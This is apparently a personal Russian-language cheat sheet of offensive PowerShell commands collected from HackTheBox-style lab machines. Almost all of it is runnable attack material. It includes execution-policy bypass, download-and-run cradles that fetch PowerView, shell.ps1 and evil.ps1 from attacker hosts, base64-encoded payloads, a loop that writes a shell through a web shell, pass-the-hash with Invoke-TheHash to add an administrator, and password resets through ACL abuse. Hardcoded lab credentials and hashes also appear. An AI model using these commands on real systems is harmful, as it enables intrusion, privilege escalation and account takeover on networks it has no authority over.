# Обход блокировка скрипта

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass 

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')

# Понизить версию Powershell

PowerShell.exe –version 2.0

Get-Host

exit

# запуск POWERSHELL В КАЛИ

    sudo pwsh Invoke-Stealth.ps1

# POWER

https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainGroupMember/

Запустить повер виев

. .\PowerView.ps1

загрузиь повервью в память

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')

    iex(iwr -usebasicparsing http://192.168.50.123/Powerview.ps1)

"powershell "IEX(New-Object Net.WebClient).downloadString(''http://10.10.14.9/shell.ps1'')""   ---Бывает и так!!!!!

Поскольку у нас нет оболочки для JDgodd, мы можем использовать PowerShell.
 System.Management.Automation.PSCredential для хранения учетных данных в нашей текущей оболочке.

 $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',
$SecPassword)

# Кодирование скриптов POwerShell
--Кодирование в base64

  $Shell=Get-Content -raw ./Invoke-PowerShellIcmp.ps1
  
  $bytes2 = [System.Text.Encoding]::Unicode.GetBytes($Shell)

  $Encoded2 | out-file icmp.ps1.b64

--Декодирование обратно

  $Decode =[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Encoded2))
  
# Загрузка скрипат построчно

!/bin/bash
export IFS=$'\n'
for line in $(cat tmp.ps1.b64);
do
max="echo ${line} >> C:\Temp\max_shell.ps1"
curl -v -G -X GET 'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx' --data-urlencode "xcmd=$max"
done


-------------------------------------
cat rev.ps1 |iconv -t UTF-16LE | base64 -w 0 (вывод)

powershell -enc (вывод)

# Восстаовление корзины

Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

# Загрузка скрипта и выполнение

    IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')

    echo IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1') | powershell -noprofile 

    iwr -uri http://10.10.14.9/test -outfile test

    IEX(IWR('10.10.10.10/script.ps1'))

    iex(iwr -usebasicparsing http://192.168.50.123/Powerview.ps1)

    -----------

echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.6:8000/winPEAS.ps1')" | iconv -t UTF-16LE| base64 -w0


powershell -encodedcommand ACkACgA=

    
# Доступ к ресурсу SMB

impacket-smbserver share .


Get-Content //10.10.14.4/file

net use z: //10.10.10.14/shares 
-----
$pass = "max" | ConvertTo-SecureString -AsPlainText -Force

$cred = New-Object System.Management.Automation.PsCredential('max, $pass')

New-PSDrive -name max -root \\10.10.14.14\share -Credential $cred -PSProvider "filesystem"

# PowerShellMafia

https://github.com/PowerShellMafia/PowerSploit.git

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.4/evil.ps1')

PowerUP

Invoke-AllChecks

# Запуск процесса от имени другого пользователя (администратора)

$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force

$creds = New-Object System.Management.Automation.PSCredential('administrator', $passwd)

Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://<LAB IP>/writeup')" -Credential $creds



$user='HTB\Tom'

$pass="01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring

$credd = New-Object System.Management.Automation.PSCredential($user, $pass)

fl

# Проверка Applocker

Get-AppLockerPolicy -effective -xml 

# Сменить пароль пользователя и установить новый

Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights ResetPassword -Verbose

$passwd = ConvertTo-SecureString 'Password123' -AsPlainText -Force
Set-DomainUserPassword Herman -AccountPassword $passwd -Verbose

# Запуск процесса powershell frm powershell зная хеш админа!!!!

https://github.com/Kevin-Robertson/Invoke-TheHash

Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators max /add"

